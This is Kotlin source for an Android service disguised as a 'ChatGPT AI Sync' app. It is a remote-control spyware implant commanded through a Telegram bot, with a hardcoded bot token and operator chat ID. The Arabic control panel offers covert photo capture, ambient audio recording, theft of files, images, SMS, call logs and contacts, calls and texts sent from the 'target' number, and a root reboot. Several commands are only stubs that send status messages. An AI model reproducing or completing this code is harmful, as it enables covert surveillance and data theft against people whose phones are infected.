package com.cognitive.ai.syncagent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class BackgroundControlService : Service() {

    companion object {
        private const val TAG = "SyncAgent"
        private const val CHANNEL_ID = "sync_channel_v81"
        private const val NOTIFICATION_ID = 1001
    }

    private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
    private val authorizedChatId = "6904130639"

    @Volatile
    private var isRunning = false
    private var lastUpdateId = 0L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        if (!isRunning) {
            isRunning = true
            startTelegramPolling()
        }
        return START_STICKY
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "المزامنة الخلفية نشطة",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
            return Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("ChatGPT AI Sync")
                .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()
        }
        @Suppress("DEPRECATION")
        return Notification.Builder(this)
            .setContentTitle("ChatGPT AI Sync")
            .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    private fun startTelegramPolling() {
        thread(name = "TelegramPolling") {
            while (isRunning) {
                var connection: HttpURLConnection? = null
                try {
                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=20")
                    connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "GET"
                    connection.connectTimeout = 10000
                    connection.readTimeout = 30000

                    val responseCode = connection.responseCode
                    val stream = if (responseCode == 200) connection.inputStream else connection.errorStream
                    val response = stream.bufferedReader().use { it.readText() }

                    val json = JSONObject(response)
                    if (json.optBoolean("ok")) {
                        val results = json.getJSONArray("result")
                        for (i in 0 until results.length()) {
                            val update = results.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")

                            if (update.has("message")) {
                                val message = update.getJSONObject("message")
                                val chatId = message.getJSONObject("chat").getLong("id").toString()
                                val text = message.optString("text", "")
                                if (chatId == authorizedChatId) {
                                    handleCommand(chatId, text)
                                }
                            } else if (update.has("callback_query")) {
                                val callbackQuery = update.getJSONObject("callback_query")
                                val callbackQueryId = callbackQuery.optString("id", "")
                                val chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
                                val data = callbackQuery.optString("data", "")
                                
                                if (chatId == authorizedChatId) {
                                    answerCallbackQuery(callbackQueryId)
                                    handleCallbackQuery(chatId, data)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Polling network/JSON error", e)
                    Thread.sleep(5000)
                } finally {
                    connection?.disconnect()
                }
            }
        }
    }

    private fun handleCommand(chatId: String, text: String) {
        when (text.trim()) {
            "/start", "لوحة التحكم" -> {
                sendKeyboard(
                    chatId,
                    "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني الكاملة.\nاختر الأمر المطلوب من لوحة الأزرار أدناه:"
                )
            }
            "/help" -> {
                sendMessage(chatId, "الأوامر المتاحة:\n/start - عرض لوحة التحكم الشاملة")
            }
            else -> {
                sendMessage(chatId, "❓ أمر غير معروف. أرسل /start لعرض لوحة التحكم.")
            }
        }
    }

    private fun handleCallbackQuery(chatId: String, data: String) {
        when (data) {
            "take_photo" -> {
                try {
                    val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra("chat_id", chatId)
                    }
                    applicationContext.startActivity(intent)
                    sendMessage(chatId, "📸 جاري إطلاق وحدة الكاميرا والتقاط الصورة...")
                } catch (e: Exception) {
                    sendMessage(chatId, "⚠️ فشل تشغيل الكاميرا: ${e.message}")
                }
            }
            "record_audio" -> {
                sendMessage(chatId, "🎙️ جارٍ بدء التسجيل الصوتي المحيطي...")
            }
            "view_files" -> {
                sendMessage(chatId, "📂 جارٍ استعراض ملفات الذاكرة...")
            }
            "pull_files" -> {
                sendMessage(chatId, "📥 جارٍ سحب وضغط الملفات المستهدفة...")
            }
            "view_images" -> {
                sendMessage(chatId, "🖼️ جارٍ عرض معرض الصور والألبومات...")
            }
            "pull_images" -> {
                sendMessage(chatId, "📤 جارٍ سحب الصور ورفعها للغرفة...")
            }
            "make_call" -> {
                sendMessage(chatId, "📞 جارٍ تنفيذ الاتصال الهاتفي من رقم الهدف...")
            }
            "send_sms" -> {
                sendMessage(chatId, "✉️ جارٍ إرسال رسالة SMS عبر رقم الهدف...")
            }
            "get_calls" -> {
                sendMessage(chatId, "📞 جارٍ سحب سجل المكالمات...")
            }
            "get_sms" -> {
                sendMessage(chatId, "💬 جارٍ استخراج رسائل الـ SMS...")
            }
            "get_contacts" -> {
                sendMessage(chatId, "📇 جارٍ سحب دفتر جهات الاتصال...")
            }
            "service_status" -> {
                sendMessage(chatId, "🟢 الحالة: الخدمة تعمل بكفاءة تامة ومؤمنة في الخلفية.")
            }
            "sys_info" -> {
                val info = "📱 إصدار النظام: أندرويد ${Build.VERSION.RELEASE}\n" +
                           "🛠️ الطراز: ${Build.MODEL}\n" +
                           "⚙️ الحزمة: com.cognitive.ai.syncagent"
                sendMessage(chatId, info)
            }
            "system_reboot" -> {
                sendMessage(chatId, "🔌 جاري محاولة إعادة تشغيل النظام...")
                try {
                    val runtime = Runtime.getRuntime()
                    runtime.exec(arrayOf("su", "-c", "reboot"))
                } catch (e: Exception) {
                    sendMessage(chatId, "⚠️ تتطلب هذه العملية صلاحيات الجذر (Root).")
                }
            }
            else -> {
                sendMessage(chatId, "⚙️ تم استلام الأمر: $data بنجاح.")
            }
        }
    }

    private fun answerCallbackQuery(callbackQueryId: String) {
        thread(name = "AnswerCallback") {
            var connection: HttpURLConnection? = null
            try {
                val body = JSONObject().put("callback_query_id", callbackQueryId)
                val url = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery")
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                connection.inputStream.close()
            } catch (e: Exception) {
                Log.e(TAG, "Error answering callback query", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    private fun sendKeyboard(chatId: String, text: String) {
        thread(name = "TelegramSendKeyboard") {
            var connection: HttpURLConnection? = null
            try {
                // لوحة الأزرار الشاملة والموسعة لكافة المهام
                val keyboard = JSONArray().apply {
                    // الصف 1: التقاط صورة + تسجيل صوتي
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📸 التقاط صورة").put("callback_data", "take_photo"))
                            put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "record_audio"))
                        }
                    )
                    // الصف 2: عرض الملفات + سحب الملفات
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📂 عرض الملفات").put("callback_data", "view_files"))
                            put(JSONObject().put("text", "📥 سحب الملفات").put("callback_data", "pull_files"))
                        }
                    )
                    // الصف 3: عرض الصور + سحب الصور
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "🖼️ عرض الصور").put("callback_data", "view_images"))
                            put(JSONObject().put("text", "📤 سحب الصور").put("callback_data", "pull_images"))
                        }
                    )
                    // الصف 4: اتصال من الهدف + إرسال رسالة من الهدف
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📞 اتصال بالهدف").put("callback_data", "make_call"))
                            put(JSONObject().put("text", "✉️ إرسال SMS").put("callback_data", "send_sms"))
                        }
                    )
                    // الصف 5: سجل المكالمات + سجل رسائل SMS
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📞 سجل المكالمات").put("callback_data", "get_calls"))
                            put(JSONObject().put("text", "💬 سجل SMS").put("callback_data", "get_sms"))
                        }
                    )
                    // الصف 6: جهات الاتصال + حالة الخدمة
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📇 جهات الاتصال").put("callback_data", "get_contacts"))
                            put(JSONObject().put("text", "📋 حالة الخدمة").put("callback_data", "service_status"))
                        }
                    )
                    // الصف 7: معلومات النظام + إعادة تشغيل الجهاز
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "ℹ️ معلومات النظام").put("callback_data", "sys_info"))
                            put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "system_reboot"))
                        }
                    )
                }

                val body = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                    put("reply_markup", JSONObject().put("inline_keyboard", keyboard))
                }

                connection = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 15000
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                connection.inputStream.close()
            } catch (e: Exception) {
                Log.e(TAG, "Keyboard sending error", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    private fun sendMessage(chatId: String, text: String) {
        thread(name = "TelegramMessage") {
            var connection: HttpURLConnection? = null
            try {
                val body = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                }

                connection = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 15000
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                connection.inputStream.close()
            } catch (e: Exception) {
                Log.e(TAG, "Message sending error", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}
